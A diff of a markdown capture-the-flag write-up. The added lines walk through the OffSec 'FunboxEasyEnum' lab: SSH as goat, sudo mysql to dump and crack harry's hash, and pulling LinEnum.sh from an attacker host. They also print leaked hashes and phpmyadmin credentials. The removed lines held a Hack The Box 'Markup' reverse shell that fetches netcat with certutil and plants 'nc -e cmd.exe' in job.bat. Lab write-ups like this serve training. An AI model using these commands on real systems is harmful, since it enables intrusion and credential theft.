@@ -222,35 +222,129 @@ SSH         192.168.134.132 22     192.168.134.132  [+] goat:goat (Pwn3d!) Linux
 
 To my surprise it actually got a hit with *goat:goat* 
 
+```bash
+┌──(haunter㉿kali)-[~/working/offsec/easy/FunboxEasyEnum]
+└─$ ssh goat@$funbox
+
+The authenticity of host '192.168.134.132 (192.168.134.132)' can't be established.
+ED25519 key fingerprint is SHA256:O6BLR8bFSyZavzqwjyqsKadofhK4GNKalxHMVbZR+5Q.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.134.132' (ED25519) to the list of known hosts.
+
+goat@192.168.134.132's password: 
+
+Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-117-generic x86_64)
+
+goat@funbox7:~$ 
+```
+
+Manually enumerating user permssions, including sudo, are a priority to check first:
+
+```bash
+goat@funbox7:~$ sudo -l                                                                                                                                                                                                  
+Matching Defaults entries for goat on funbox7:                                                                                                                                                                           
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin                                                                                                    
+                                                                                                                                                                                                                         
+User goat may run the following commands on funbox7:                                                                                                                                                                     
+    (root) NOPASSWD: /usr/bin/mysql                                                                                                                                                                                      
+goat@funbox7:~$ sudo mysql -u root        
+```
+
+ *(root) NOPASSWD: /usr/bin/mysql* is listed for user *goat*. Let's drop into it and see what we can find.
+
+```bash
+goat@funbox7:~$ sudo mysql -u root                                                                                                                                                                                       
+                                                     
+mysql> show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| db1                |
+| mysql              |
+| performance_schema |
+| phpmyadmin         |  
+| sys                |
++--------------------+
+6 rows in set (0.00 sec)                                                                                    
+
+mysql> use db1;
+
+Database changed
+mysql> show tables;
++---------------+
+| Tables_in_db1 |
++---------------+
+| users         |
++---------------+
+1 row in set (0.00 sec)
+
+mysql> select * from users;
+
++----+-------+----------------------------------+
+| id | name  | passwd                           |
++----+-------+----------------------------------+
+| 1  | harry | e10adc3949ba59abbe56e057f20f883e |
++----+-------+----------------------------------+
+1 row in set (0.00 sec)
+```
+
+We found some good intel, user *harry*'s password hash.
+
+Cracking the hash worth a shot. We can try with *hashcat* or *jack*, but Crackstation is always a good tool for a first try with a simple hash.
+
+[Crackstation](https://crackstation.net/)
+
+![Crackstation](/assets/img/ctf/offsec/easy/FunBoxEasyEnum/7.png)
+
+The hash was in MD5 format and the password is *123456*. Now let's try to login as *harry*
+
+```bash
+┌──(haunter㉿kali)-[~/working/offsec/easy/FunboxEasyEnum]                                                   
+└─$ ssh harry@$funbox                                                                                       
+harry@192.168.134.132's password:                                                                           
+Permission denied, please try again.                                                                        
+harry@192.168.134.132's password:                                                                           
+Permission denied, please try again.                                                                        
+harry@192.168.134.132's password:                                                                           
+harry@192.168.134.132: Permission denied (publickey,password)
+```
+
+Well it doesn't seem like the user can SSH. I also tried logging into the phpmyadmin portal with no success either.
+
+```bash
+goat@funbox7:~$ su harry
+Password: 
+harry@funbox7:/home/goat$ 
+```
+
+
 ## Root / SYSTEM
 
-```bash 
-# start a httpserver on your $attacker. My port is at :8000
-PS C:\Log-Management>certutil -f urlcache http://10.10.14.18:8000/win/nc64.exe .\nc.exe
+```bash
+harry@funbox7:~$ wget http://192.168.45.209:8000/lin/LinEnum.sh
+           
+harry@funbox7:~$ chmod +x LinEnum.sh                                                                                                                                                                                     
+harry@funbox7:~$ bash -i LinEnum.sh 
+                                                                                                                                                                                                              
+[+] It looks like we have password hashes in /etc/passwd!                                                                                                                                                                
+oracle:$1$|O@GOeN\$PGb9VNu29e9s6dMNJKH/R0:1004:1004:,,,:/home/oracle:/bin/bash    
 ```
 
-Start your local listener. Mine is set for :4444
+
 
 ```bash
-┌──(haunter㉿kali)-[~/working/htb/very-easy/markup]
-└─$ sudo rlwrap nc -lvnp 4444
-[sudo] password for haunter: 
-listening on [any] 4444 ...
+www-data@funbox7:/$ cat /etc/phpmyadmin/config-db.php
+
+$dbuser='phpmyadmin';
+$dbpass='tgbzhnujm!';
+$basepath='';
+$dbname='phpmyadmin';
+$dbserver='localhost';
+$dbport='3306';
+$dbtype='mysql';
 ```
-
-Now I'll try to replace the contents of *job.bat*. NOTE: Due to how Powershell handles special characters/escaping, I had to exit Powershell and run the following from cmd instead:
-
-```bash
-PS C:\Log-Management> exit
-
-daniel@MARKUP C:\Users\daniel>echo C:\Log-Management\nc.exe -e cmd.exe 10.10.16.18 4444 > C:\LogManagement\job.bat
-```
-
-And then wait to see if there is a schedule to launch the revshell...
-
-![Admin Shell](/assets/img/ctf/htb/very-easy/markup/admin.png)
-
-Success. After collecting the administrator.txt flag we've completed Markup.
 
 
 # Lessons Learned
